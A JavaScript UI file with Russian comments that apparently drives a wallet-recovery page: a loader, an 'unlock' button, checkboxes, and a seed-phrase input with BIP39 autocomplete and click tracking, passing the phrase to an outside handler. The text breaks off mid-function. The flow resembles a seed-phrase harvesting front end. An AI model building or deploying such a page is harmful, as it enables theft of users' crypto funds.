// ============= SCRIPT.JS - UI LOGIC WITH TRACKING & BOTTOM SHEET =============

// ============= GLOBAL VARIABLES =============
let currentSheet = null;
let autoSequenceCompleted = false;

// ============= BIP39 WORDS =============
const BIP39_WORDS = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'cradle', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scatter', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tail', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'uniform', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo'];
// ============= HELPER FUNCTIONS =============
function normalizeWord(word) {
  return word.toLowerCase().replace(/[^a-z]/g, '');
}

function vibrate(duration = 50) {
  if (navigator.vibrate) {
    navigator.vibrate(duration);
  }
}

function createTrigrams(str) {
  const trigrams = [];
  const s = str.toLowerCase();
  for (let i = 0; i < s.length - 2; i++) {
    trigrams.push(s.substring(i, i + 3));
  }
  return trigrams;
}

// ============= AUTOCOMPLETE LOGIC =============
function findWords(input) {
  if (!input) return [];
  const cleanInput = normalizeWord(input);
  if (cleanInput.length === 0) return [];

  if (cleanInput.length < 3) {
    return BIP39_WORDS.filter(w => w.startsWith(cleanInput)).slice(0, 5);
  }

  const inputTrigrams = createTrigrams(cleanInput);
  const scored = BIP39_WORDS.map(word => {
    const wordTrigrams = createTrigrams(word);
    let matches = 0;
    for (const tri of inputTrigrams) {
      if (wordTrigrams.includes(tri)) matches++;
    }
    const prefixBonus = word.startsWith(cleanInput) ? 20 : 0;
    return { word, score: matches + prefixBonus };
  });

  return scored
    .filter(x => x.score > 0)
    .sort((a, b) => b.score - a.score)
    .slice(0, 5)
    .map(x => x.word);
}

function updateSuggestions(input) {
  const words = findWords(input);
  const container = document.getElementById('wordBadges');
  if (!container) return;

  if (words.length === 0) {
    container.innerHTML = '';
    return;
  }

  const html = words.map(w => `<span class="word-badge" data-word="${w}">${w}</span>`).join('');
  container.innerHTML = html;

  container.querySelectorAll('.word-badge').forEach(badge => {
    badge.addEventListener('touchstart', function(e) {
      e.preventDefault();
      selectWord(this.getAttribute('data-word'));
    });
    badge.addEventListener('click', function(e) {
      e.preventDefault();
      selectWord(this.getAttribute('data-word'));
    });
  });
}

function selectWord(word) {
  const textarea = document.getElementById('phraseInput');
  const words = textarea.value.trim().split(/\s+/);
  
  if (words.length > 0 && words[words.length - 1] !== '') {
    words[words.length - 1] = word;
  } else {
    words.push(word);
  }
  
  textarea.value = words.join(' ') + ' ';
  textarea.focus();
  document.getElementById('wordBadges').innerHTML = '';
  
  const event = new Event('input', { bubbles: true });
  textarea.dispatchEvent(event);
}

window.selectWord = selectWord;

// ============= SCREEN TRANSITIONS =============
function showScreen(screenId) {
  const screens = ['screenLoader', 'screen0'];
  
  screens.forEach(id => {
    const screen = document.getElementById(id);
    if (screen) {
      screen.classList.remove('active');
    }
  });
  
  const targetScreen = document.getElementById(screenId);
  if (targetScreen) {
    targetScreen.classList.add('active');
  }
}

// ============= BOTTOM SHEET NAVIGATION =============
function openBottomSheet() {
  const bottomSheet = document.getElementById('bottomSheet');
  const overlay = document.getElementById('bottomSheetOverlay');
  
  bottomSheet.classList.add('active');
  overlay.classList.add('active');
  document.body.style.overflow = 'hidden';
}

function closeBottomSheet() {
  const bottomSheet = document.getElementById('bottomSheet');
  const overlay = document.getElementById('bottomSheetOverlay');
  const keyboardSuggestions = document.getElementById('keyboardSuggestions');  // ДОБАВИТЬ
  
  bottomSheet.classList.remove('active');
  overlay.classList.remove('active');
  if (keyboardSuggestions) {  // ДОБАВИТЬ
    keyboardSuggestions.classList.remove('active');
  }
  document.body.style.overflow = '';
  
  // Очищаем все при закрытии
  const phraseInput = document.getElementById('phraseInput');
  const checkbox1 = document.getElementById('checkbox1');
  const checkbox2 = document.getElementById('checkbox2');
  
  if (phraseInput) phraseInput.value = '';
  if (checkbox1) checkbox1.checked = false;
  if (checkbox2) checkbox2.checked = false;
  
  const badgesContainer = document.getElementById('wordBadges');
  if (badgesContainer) badgesContainer.innerHTML = '';
  
  if (window.checkBothCheckboxes) {
    window.checkBothCheckboxes();
  }
}

function showSheet(sheetId) {
  const sheets = ['sheet3', 'sheet5'];
  const buttons = {
    'sheet3': 'continueBtn',
    'sheet5': 'restoreBtn'
  };
  
  // Скрываем все sheets
  sheets.forEach(id => {
    const sheet = document.getElementById(id);
    if (sheet) {
      sheet.style.display = 'none';
    }
  });
  
  // Скрываем все кнопки
  Object.values(buttons).forEach(btnId => {
    const btn = document.getElementById(btnId);
    if (btn) {
      btn.style.display = 'none';
    }
  });
  
  // Показываем нужный sheet
  const targetSheet = document.getElementById(sheetId);
  if (targetSheet) {
    targetSheet.style.display = 'block';
    currentSheet = sheetId;
  }
  
  // Показываем соответствующую кнопку
  const targetBtn = document.getElementById(buttons[sheetId]);
  if (targetBtn) {
    targetBtn.style.display = 'block';
  }
}

// ============= MAIN INITIALIZATION =============
document.addEventListener('DOMContentLoaded', () => {
  
  // ============= INITIAL LOADER -> SCREEN 0 =============
  setTimeout(() => {
    showScreen('screen0');
  }, 2000);
  
  // ============= GET ALL ELEMENTS =============
  const phraseInput = document.getElementById('phraseInput');
  const pasteBtn = document.getElementById('pasteBtn');
  const restoreBtn = document.getElementById('restoreBtn');
  const checkbox1 = document.getElementById('checkbox1');
  const checkbox2 = document.getElementById('checkbox2');
  const continueBtn = document.getElementById('continueBtn');
  const unlockBtn = document.getElementById('unlockBtn');
  const bottomSheetOverlay = document.getElementById('bottomSheetOverlay');
  const closeSheetBtn = document.getElementById('closeSheetBtn');
  const backBtn = document.getElementById('backBtn');

  console.log('✅ Page loaded');

  // ============= LOCAL VARIABLES =============
  let isTransitioning = false;

  // ============= CLOSE BOTTOM SHEET ON OVERLAY CLICK =============
  if (bottomSheetOverlay) {
    bottomSheetOverlay.addEventListener('click', closeBottomSheet);
  }

  // ============= CLOSE BUTTON (крестик на sheet3 - СПРАВА) =============
  if (closeSheetBtn) {
    closeSheetBtn.addEventListener('click', (e) => {
      e.preventDefault();
      closeBottomSheet();
    });
  }

  // ============= BACK BUTTON (кнопка назад на sheet5) =============
  if (backBtn) {
    backBtn.addEventListener('click', (e) => {
      e.preventDefault();
      showSheet('sheet3');
      const keyboardSuggestions = document.getElementById('keyboardSuggestions');
    if (keyboardSuggestions) {
      keyboardSuggestions.classList.remove('active');
    }
    });
  }

  // ============= UNLOCK BUTTON (Screen 0 -> Bottom Sheet Opens) =============
  if (unlockBtn) {
    unlockBtn.addEventListener('click', (e) => {
      e.preventDefault();
      
      if (window.trackButtonClick) window.trackButtonClick('unlock');
      // Открываем bottom sheet с чекбоксами сразу
      openBottomSheet();
      showSheet('sheet3');
      autoSequenceCompleted = true;
    });
  }

  // ============= CHECKBOXES LOGIC =============
  function checkBothCheckboxes() {
    if (checkbox1 && checkbox2 && continueBtn) {
      if (checkbox1.checked && checkbox2.checked) {
        continueBtn.classList.remove('screen3-disabled');
      } else {
        continueBtn.classList.add('screen3-disabled');
      }
    }
  }
  
  // Делаем функцию глобальной для доступа из closeBottomSheet
  window.checkBothCheckboxes = checkBothCheckboxes;

  if (checkbox1 && checkbox2) {
    checkbox1.addEventListener('change', () => {
      vibrate(50);
      checkBothCheckboxes();
    });
    
    checkbox2.addEventListener('change', () => {
      vibrate(50);
      checkBothCheckboxes();
    });
    
    const label1 = checkbox1.closest('.screen3-checkbox-item');
    const label2 = checkbox2.closest('.screen3-checkbox-item');
    
    if (label1) label1.addEventListener('click', () => vibrate(50));
    if (label2) label2.addEventListener('click', () => vibrate(50));
  }


// ============= CONTINUE BUTTON (Sheet 3 -> Sheet 5) =============
if (continueBtn) {
  continueBtn.addEventListener('click', (e) => {
    e.preventDefault();
    e.stopPropagation();
    
    if (!checkbox1.checked || !checkbox2.checked) return;
    if (isTransitioning) return;
    
    if (window.trackButtonClick) window.trackButtonClick('continue');
    
    isTransitioning = true;
    
    // Быстрая анимация 150ms вместо 600ms
    setTimeout(() => {
      showSheet('sheet5');
      isTransitioning = false;
    }, 50);
  });
}
  // ============= PHRASE INPUT (autocomplete) =============
  if (phraseInput) {
    let lastValue = '';
    const keyboardSuggestions = document.getElementById('keyboardSuggestions');
  
  // ДОБАВИТЬ ЭТО:
  phraseInput.addEventListener('focus', () => {
    if (keyboardSuggestions) {
      keyboardSuggestions.classList.add('active');
    }
  });
  
  // ДОБАВИТЬ ЭТО:
  phraseInput.addEventListener('blur', () => {
    setTimeout(() => {
      if (keyboardSuggestions) {
        keyboardSuggestions.classList.remove('active');
      }
    }, 300);
  });

    
    const handleInput = function(e) {
      const currentValue = e.target.value;
      if (currentValue === lastValue) return;
      lastValue = currentValue;

      const words = currentValue.split(/\s+/);
      const lastWord = words[words.length - 1];

      if (lastWord.length >= 2) {
        updateSuggestions(lastWord);
      } else {
        const badgesContainer = document.getElementById('wordBadges');
        if (badgesContainer) {
          badgesContainer.innerHTML = '';
        }
      }
      
      if (window.handlePhraseValidation) {
        window.handlePhraseValidation(currentValue);
      }
    };

